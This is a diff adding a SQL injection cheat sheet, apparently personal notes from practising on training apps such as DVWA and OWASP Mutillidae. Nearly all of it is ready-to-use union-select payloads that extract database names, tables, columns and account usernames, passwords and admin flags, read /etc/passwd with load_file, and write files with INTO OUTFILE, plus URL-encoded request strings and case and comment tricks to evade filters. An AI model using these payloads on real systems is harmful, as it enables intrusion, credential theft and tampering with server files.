@@ -1,0 +1,69 @@
+General select syntax:
+
+UniOn selEct [number of columns] [comment]
+
+
+Examples:
+We will assume that there are 2 columns and comlumn 2 can be used to display data on screen.
+
+Seleting database version:
+UniOn selEct 1,version() /*
+
+Database:
+UniOn selEct 1,database() /*
+
+Database user:
+UniOn selEct 1,user() /*
+
+Database tables:
+UniOn selEct 1,table_name frOm information_schema.tables table_schema = '[database name]' /*
+
+
+
+union select 1,table_name,null,null,5 from information_schema.tables where table_schema = 'owasp10'
+
+union select 1,column_name,null,null,5 from information_schema.columns where table_name = 'accounts'
+
+
+
+
+union select 1,username,password,is_admin,5 from accounts
+
+Table Columns:
+UniOn selEct 1,column_name frOm information_schema.columns table_name = '[table name]' /*
+
+Selecting data from table:
+UniOn selEct 1,[column name] frOm [table name] /*
+
+Reading files:
+UniOn selEct 1,load_file('file location') /*
+
+Writing files:
+UniOn selEct null,[file content] inTo outfile '/location/to/write/file/to' /*
+
+#########################################
+
+%23
+index.php?page=user-info.php&username=nay' order by 1#&password=123456&user-info-php-submit-button=View+Account+Details
+
+index.php?page=user-info.php&username=nay' order by 1%23&password=123456&user-info-php-submit-button=View+Account+Details
+
+
+union select 1,2,3,4,5
+union select 1,database(),user(),version(),5
+
+
+/dvwa/vulnerabilities/sqli/?id=1 union select table_name,2 from information_schema.tables where table_schema = 0x64767761 %23&Submit=Submit#
+
+
+1'+uNioN/**/sEleCt/**/table_name,2+fRom+information_schema.tables%23&Submit=Submit#
+###################
+
+-1'+uNioN/**/sEleCt/**/table_name,2+fRom+information_schema.tables%23
+
+1'+uNioN/**/sEleCt/**/table_name,2+fRom+information_schema.tables+where+table_schema='dvwa'+limit+1,1%23&Submit=Submit#
+
+1'+uNioN/**/sEleCt/**/table_name,2+fRom+information_schema.tables limit+1,1%23
+################
+union select nullll,load_file('/etc/passwd'),null,null,null
+#######################################################
